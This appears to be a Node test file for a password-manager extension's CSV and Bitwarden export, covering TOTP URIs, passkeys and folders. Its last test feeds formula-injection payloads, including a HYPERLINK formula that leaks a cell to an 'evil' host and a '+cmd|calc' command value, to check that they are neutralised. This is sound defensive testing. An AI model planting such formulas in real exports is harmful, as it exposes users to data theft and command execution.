import { test } from 'node:test';
import assert from 'node:assert/strict';
import { toCsv, CSV_COLUMNS, totpUri, noFormula } from '../../extension/src/lib/export/csv.js';
import { toBitwardenJson, bitwardenCredentialId } from '../../extension/src/lib/export/bitwarden.js';
import { csvToObjects } from '../../extension/src/lib/import/csv.js';
import { parseOtpauthUri } from '../../extension/src/lib/totp.js';
import { makeItem, defaultData, passkeyFromImport } from '../../extension/src/lib/vault.js';
import { createCredential } from '../../extension/src/lib/webauthn.js';
import { toB64url, fromB64url, randomBytes } from '../../extension/src/shared/bytes.js';

const T0 = Date.UTC(2026, 0, 2, 3, 4, 5);
const T1 = Date.UTC(2026, 5, 6, 7, 8, 9);
const TOTP = { secret: 'JBSWY3DPEHPK3PXP', algorithm: 'SHA256', digits: 8, period: 60, issuer: 'GitHub', label: 'hina' };

async function sampleData() {
  const cred = await createCredential({ rpId: 'github.com', userHandle: randomBytes(16), clientDataHash: randomBytes(32) });
  const passkey = {
    credentialId: toB64url(cred.credentialId), rpId: 'github.com', userHandle: toB64url(randomBytes(16)),
    userName: 'hina', userDisplayName: 'Hina', privateKey: toB64url(cred.privateKey), publicKey: toB64url(cred.cosePublicKey),
    alg: -7, signCount: 0, createdAt: T0, lastUsedAt: null,
  };
  const data = defaultData(T1);
  data.items.push(
    makeItem({
      title: 'GitHub', url: 'https://github.com/login', username: 'hina@example.jp', password: 'p@ss, "quoted"\nline',
      totp: TOTP, fav: true, vault: 'work', passkeys: [passkey], createdAt: T0, updatedAt: T1,
    }, T1),
    makeItem({ type: 'note', title: '金庫の暗証番号', note: '1234\n二行目', vault: 'family', createdAt: T0, updatedAt: T0 }, T1),
    makeItem({ title: 'No URL', username: ' spaced ', password: '', totp: { ...TOTP, label: '', issuer: '' } }, T1),
    makeItem({ title: 'Orphan', url: 'https://orphan.example', vault: 'gone' }, T1),
  );
  return { data, passkey, cred };
}

test('toCsv: Chrome-compatible header, every item (notes too), TOTP as otpauth URI, vault name, favorite', async () => {
  const { data } = await sampleData();
  const csv = toCsv(data);
  assert.ok(csv.startsWith('name,url,username,password,note,totp,vault,favorite\r\n'));
  assert.deepEqual(CSV_COLUMNS, ['name', 'url', 'username', 'password', 'note', 'totp', 'vault', 'favorite']);
  assert.ok(!csv.includes('BEGIN PRIVATE') && !csv.includes(data.items[0].passkeys[0].privateKey), 'no passkey keys in CSV');

  const { headers, records } = csvToObjects(csv);
  assert.deepEqual(headers, CSV_COLUMNS);
  assert.equal(records.length, 4);
  const [gh, note, nourl, orphan] = records;
  assert.deepEqual({ ...gh, totp: undefined }, {
    name: 'GitHub', url: 'https://github.com/login', username: 'hina@example.jp', password: 'p@ss, "quoted"\nline',
    note: '', totp: undefined, vault: '仕事', favorite: 'true',
  });
  assert.deepEqual(parseOtpauthUri(gh.totp), TOTP);
  assert.deepEqual(note, {
    name: '金庫の暗証番号', url: '', username: '', password: '', note: '1234\n二行目', totp: '', vault: '家族', favorite: 'false',
  });
  assert.equal(nourl.username, ' spaced ', 'surrounding spaces survive (quoted)');
  assert.equal(parseOtpauthUri(nourl.totp).label, 'spaced', 'empty TOTP label falls back to the username');
  assert.equal(orphan.vault, 'gone', 'unknown vault id kept as-is');
});

test('totpUri: empty without TOTP', () => {
  assert.equal(totpUri({ totp: null }), '');
});

test('toBitwardenJson: unencrypted export shape, folders from vaults, login/secure note, TOTP, favorite, dates', async () => {
  const { data } = await sampleData();
  const out = JSON.parse(toBitwardenJson(data));
  assert.equal(out.encrypted, false);
  assert.deepEqual(out.folders, [{ id: 'personal', name: '個人' }, { id: 'work', name: '仕事' }, { id: 'family', name: '家族' }]);
  assert.equal(out.items.length, 4);
  const [gh, note, nourl, orphan] = out.items;

  assert.equal(gh.id, data.items[0].id);
  assert.equal(gh.type, 1);
  assert.equal(gh.folderId, 'work');
  assert.equal(gh.name, 'GitHub');
  assert.equal(gh.notes, null);
  assert.equal(gh.favorite, true);
  assert.equal(gh.creationDate, new Date(T0).toISOString());
  assert.equal(gh.revisionDate, new Date(T1).toISOString());
  assert.equal(gh.login.username, 'hina@example.jp');
  assert.equal(gh.login.password, 'p@ss, "quoted"\nline');
  assert.deepEqual(gh.login.uris, [{ match: null, uri: 'https://github.com/login' }]);
  assert.deepEqual(parseOtpauthUri(gh.login.totp), TOTP);
  assert.equal(gh.secureNote, undefined);

  assert.equal(note.type, 2);
  assert.deepEqual(note.secureNote, { type: 0 });
  assert.equal(note.notes, '1234\n二行目');
  assert.equal(note.folderId, 'family');
  assert.equal(note.login, undefined);
  assert.equal(note.fields, undefined);

  assert.deepEqual(nourl.login.uris, []);
  assert.equal(nourl.login.password, null);
  assert.equal(nourl.folderId, 'personal');
  assert.equal(orphan.folderId, null, 'unknown vault → no folder');
});

test('toBitwardenJson: passkeys → fido2Credentials (Bitwarden shape, PKCS8 keyValue) that import back', async () => {
  const { data, passkey, cred } = await sampleData();
  const [fido] = JSON.parse(toBitwardenJson(data)).items[0].login.fido2Credentials;
  assert.deepEqual(fido, {
    credentialId: 'b64.' + passkey.credentialId,
    keyType: 'public-key',
    keyAlgorithm: 'ECDSA',
    keyCurve: 'P-256',
    keyValue: passkey.privateKey,
    rpId: 'github.com',
    userHandle: passkey.userHandle,
    userName: 'hina',
    counter: '0',
    rpName: 'github.com',
    userDisplayName: 'Hina',
    discoverable: 'true',
    creationDate: new Date(T0).toISOString(),
  });
  // The key is a usable PKCS8 P-256 key; importing derives the same COSE public key.
  const back = await passkeyFromImport({ ...passkey, privateKey: fido.keyValue, publicKey: undefined }, T1);
  assert.equal(back.publicKey, toB64url(cred.cosePublicKey));
});

test('bitwardenCredentialId: 16-byte ids as GUIDs, others as b64.<base64url>', () => {
  const id16 = toB64url(Uint8Array.from({ length: 16 }, (_, i) => i * 17));
  assert.equal(bitwardenCredentialId(id16), '00112233-4455-6677-8899-aabbccddeeff');
  const id32 = toB64url(randomBytes(32));
  assert.equal(bitwardenCredentialId(id32), 'b64.' + id32);
  assert.equal(fromB64url(bitwardenCredentialId(id32).slice(4)).length, 32);
});

test('toBitwardenJson: login fields on a secure note are kept as custom fields', () => {
  const data = defaultData(T1);
  data.items.push(makeItem({ type: 'note', title: 'Wi-Fi', url: 'https://router.local', username: 'admin', password: 'pw', note: 'n' }, T1));
  data.items.push(makeItem({ title: '' }, T1));
  const [note, untitled] = JSON.parse(toBitwardenJson(data)).items;
  assert.deepEqual(note.fields, [
    { name: 'url', value: 'https://router.local', type: 0, linkedId: null },
    { name: 'username', value: 'admin', type: 0, linkedId: null },
    { name: 'password', value: 'pw', type: 1, linkedId: null },
  ]);
  assert.equal(untitled.name, '--', 'Bitwarden needs a name');
});

test('empty vault exports a header-only CSV and an empty Bitwarden item list', () => {
  const data = defaultData(T1);
  assert.equal(toCsv(data), 'name,url,username,password,note,totp,vault,favorite\r\n');
  assert.deepEqual(JSON.parse(toBitwardenJson(data)).items, []);
});

test('toCsv: formula-looking name/url/note/vault cells get a leading quote; credentials are never altered', () => {
  const data = defaultData(T1);
  data.vaults.push({ id: 'evil', name: '@SUM(A1)', hue: 1 });
  const evil = '=HYPERLINK("https://evil/?"&D2,"open")';
  data.items.push(makeItem({
    title: evil, username: '=user', password: '-pass+', note: '+cmd|calc', vault: 'evil',
    totp: { secret: 'JBSWY3DPEHPK3PXP', label: '=label', issuer: '' },
  }, T1));
  data.items.push(makeItem({ title: '\tTab', note: '\rCR', username: '@me', password: '=1+1' }, T1));
  data.items.push(makeItem({ title: 'plain - title', note: 'a=b', password: 'x' }, T1));
  const [a, b, c] = csvToObjects(toCsv(data)).records;
  assert.equal(a.name, "'" + evil);
  assert.equal(a.note, "'+cmd|calc");
  assert.equal(a.vault, "'@SUM(A1)");
  assert.deepEqual([a.username, a.password], ['=user', '-pass+'], 'username/password exported as-is');
  assert.match(a.totp, /^otpauth:\/\//);
  assert.equal(b.name, "'\tTab");
  assert.equal(b.note, "'\rCR");
  assert.deepEqual([b.username, b.password], ['@me', '=1+1']);
  assert.deepEqual([c.name, c.note], ['plain - title', 'a=b'], 'only a leading character triggers it');

  for (const ch of ['=', '+', '-', '@', '\t', '\r']) assert.equal(noFormula(ch + 'x'), "'" + ch + 'x');
  for (const s of ['', 'x', ' =x', "'=x", ',', '0', 'https://a']) assert.equal(noFormula(s), s);
  assert.equal(noFormula(null), '');
});
